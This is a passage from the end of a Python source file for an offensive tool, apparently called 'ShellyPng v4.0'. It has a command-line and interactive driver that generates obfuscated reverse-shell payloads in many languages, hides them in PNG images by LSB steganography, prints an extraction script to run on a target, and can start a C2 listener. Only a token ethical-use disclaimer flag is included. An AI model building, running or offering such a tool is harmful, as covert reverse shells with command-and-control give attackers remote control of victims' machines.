            listen_host = get_input("C2 Listen Address", "0.0.0.0") if start_server else "0.0.0.0"
            # Create ShellyPng instance
            shelly = ShellyPng(c2_host=c2_host, c2_port=c2_port, image_path=image_path, output_path=output_path,
                             payload_type=payload_type, obfuscation_level=obfuscation_level,
                             bits_per_channel=bits_per_channel, use_alpha=use_alpha,
                             listen_host=listen_host, mode=mode, verbose=verbose, quiet=False)

        # --- Generate and Output ---
        success, final_command = shelly.generate()
        # ... (Output logic - same as previous) ...
        if success:
            print(f"\n{Style.BRIGHT}{Fore.RED}--- Manifestation Complete ---{Style.RESET_ALL}")
            if shelly.mode == 'stego':
                shelly.log(f"Spectral image materialized: {shelly.output_path}", "success")
                shelly.log("Python Extraction/Execution script:", "info")
                script_path = final_command.split(' ')[-1]
                print(f"{Fore.GREEN}./{os.path.basename(script_path)}{Style.RESET_ALL}")
                shelly.log(f"(Ensure '{os.path.basename(shelly.output_path)}' is co-located with the script on target)", "warning")
            else: # generate_only
                shelly.log("Payload Generation & Obfuscation Guidance:", "info")
                print(f"{Fore.GREEN}{final_command}{Style.RESET_ALL}")
            print(f"{Style.BRIGHT}{Fore.RED}------------------------------{Style.RESET_ALL}")

            if start_server and any(pt in shelly.payload_type for pt in ['tcp', 'nc']):
                 print()
                 shelly.start_c2_server()
            elif start_server:
                 shelly.log("Listener not started (payload type may not require one).", "warning")
        else:
            shelly.log(f"Process failed during '{shelly.mode}' mode.", "error")

    except KeyboardInterrupt: print(f"\n{Fore.RED}Operation aborted by user.{Style.RESET_ALL}")
    except ValueError as ve: print(f"\n{Fore.RED}[X] Configuration Error: {ve}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT}[X] Unexpected Error:{Style.RESET_ALL} {Fore.RED}{e}{Style.RESET_ALL}")
        if shelly and shelly.verbose: import traceback; traceback.print_exc()

def cli_mode():
    # ... (CLI mode - add new payload choices) ...
    parser = argparse.ArgumentParser(
        description=f"ShellyPng v4.0 - Matrin Rain Shadow Shell. Shell Generation & LSB Steganography.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('mode', choices=['stego', 'generate'], help="Operation mode: 'stego' (embed) or 'generate' (payload only)")
    # Common Options
    parser.add_argument("-H", "--host", help="C2 callback host/IP", default=None)
    parser.add_argument("-p", "--port", help=f"C2 callback port (default: {DEFAULT_C2_PORT})", type=int, default=DEFAULT_C2_PORT)
    payload_choices = [ # Added new shells
        "python_reverse_tcp", "powershell_reverse_tcp", "bash_reverse_tcp",
        "bash_mkfifo", "php_reverse_tcp", "perl_reverse_tcp",
        "nc_reverse_tcp", "nc_mkfifo", "ruby_reverse_tcp", "nodejs_reverse_tcp"
    ]
    parser.add_argument("-t", "--type", help="Payload type", choices=payload_choices, default=DEFAULT_PAYLOAD_TYPE)
    parser.add_argument("-O", "--obfuscation", help="Obfuscation level (0=None, 1=Basic, 2=Advanced)", type=int, default=DEFAULT_OBFUSCATION_LEVEL, choices=[0,1,2])
    # Stego Mode Options
    stego_group = parser.add_argument_group('Steganography Options (mode: stego)')
    stego_group.add_argument("-i", "--image", help=f"Input image path", default=None)
    stego_group.add_argument("-o", "--output", help=f"Output stego image path", default=None)
    stego_group.add_argument("-b", "--bits", help="LSB bits per channel (1-8)", type=int, default=DEFAULT_BITS_PER_CHANNEL)
    stego_group.add_argument("-a", "--alpha", help="Use Alpha channel", action="store_true")
    # C2 Server Options
    c2_group = parser.add_argument_group('C2 Listener Options')
    c2_group.add_argument("-s", "--server", help="Start C2 listener", action="store_true")
    c2_group.add_argument("-L", "--listen", help="C2 listen address", default="0.0.0.0")
    # Output & Control
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
    parser.add_argument("-q", "--quiet", help="Suppress banner and non-essential messages", action="store_true")
    parser.add_argument('--agree', action='store_true', help='Acknowledge ethical use disclaimer')
    args = parser.parse_args()

    # --- Argument Validation & Disclaimer ---
    # ... (Validation logic - same as previous) ...
    if args.mode == 'stego':
         if not args.image or not args.output: parser.error("--image and --output are required for stego mode.")
         if not (1 <= args.bits <= 8): parser.error(f"Bits (-b) must be between 1 and 8, got {args.bits}")
    if any(pt in args.type for pt in ['tcp', 'nc']) and not args.host:
         if args.mode == 'generate': print(f"{Fore.YELLOW}[!] Warning: C2 Host (--host) not specified for reverse shell type. Using default: {DEFAULT_C2_HOST}{Style.RESET_ALL}"); args.host = DEFAULT_C2_HOST
         else: parser.error("--host is required for reverse shell payload types.")
    if not args.quiet:
        animate_matrin_rain_banner()
        if not args.agree and not print_disclaimer(args.quiet): sys.exit(1)
        elif args.agree: print(f"{Fore.GREEN}Agreement acknowledged via --agree flag.{Style.RESET_ALL}\n")

    # --- Initialize and Run ---
    try:
        shelly = ShellyPng(
            c2_host=args.host, c2_port=args.port, image_path=args.image, output_path=args.output,
            payload_type=args.type, obfuscation_level=args.obfuscation, bits_per_channel=args.bits,
            use_alpha=args.alpha, listen_host=args.listen, mode=args.mode,
            verbose=args.verbose, quiet=args.quiet
        )
        success, final_command = shelly.generate()
        if not success: return 1
        # --- Output Result ---
        # ... (Output logic - same as previous) ...
        if not args.quiet: print(f"\n{Style.BRIGHT}{Fore.RED}--- Manifestation Complete ---{Style.RESET_ALL}")
        if args.mode == 'stego':
             shelly.log(f"Spectral image materialized: {shelly.output_path}", "success")
             shelly.log("Python Extraction/Execution script:", "info")
             script_path = final_command.split(' ')[-1]
             print(f"{Fore.GREEN}{script_path}{Style.RESET_ALL}")
             shelly.log(f"(Run with: python3 {script_path} on target)", "info")
        else: # generate
             shelly.log("Payload Generation & Obfuscation Guidance:", "info")
             print(f"{Fore.GREEN}{final_command}{Style.RESET_ALL}")
        if not args.quiet: print(f"{Style.BRIGHT}{Fore.RED}------------------------------{Style.RESET_ALL}")
        # --- Start Server ---
        if args.server and any(pt in args.type for pt in ['tcp', 'nc']): print(); shelly.start_c2_server()
        elif args.server: shelly.log("Listener not started (payload type may not require one).", "warning")
        return 0
    except ValueError as ve: print(f"\n{Fore.RED}[X] Configuration Error: {ve}{Style.RESET_ALL}"); return 1
    except Exception as e: print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT}[X] Unexpected CLI Error:{Style.RESET_ALL} {Fore.RED}{e}{Style.RESET_ALL}"); return 1

def main():
    # ... (Main logic - same as previous) ...
    if len(sys.argv) <= 1 or ('-h' not in sys.argv and '--help' not in sys.argv and sys.argv[1] in ['interactive', '-i', '--interactive']):
         interactive_mode(use_inquirer=(inquirer is not None))
         return 0
    else: return cli_mode()

if __name__ == "__main__":
    try: exit_code = main(); sys.exit(exit_code)
    except SystemExit as se: sys.exit(se.code)
    except Exception as e:
        print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠️ FATAL SHADOW ERROR ☠️]{Style.RESET_ALL}")
        print(f"{Fore.RED}Unhandled Exception: {type(e).__name__}: {e}{Style.RESET_ALL}")
        import traceback; traceback.print_exc()
        sys.exit(1)
